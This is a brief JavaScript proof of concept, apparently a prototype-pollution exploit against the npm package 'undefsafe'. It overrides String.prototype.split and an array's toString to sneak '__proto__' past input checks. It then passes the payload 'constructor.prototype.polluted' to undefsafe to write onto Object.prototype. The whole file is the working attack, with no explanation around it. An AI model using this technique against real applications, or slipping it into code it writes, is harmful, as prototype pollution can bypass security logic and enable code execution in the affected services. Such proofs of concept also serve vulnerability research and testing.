var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const a = require('undefsafe');
const obj = {};
const payload = 'constructor.prototype.polluted';
a({}, payload, 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');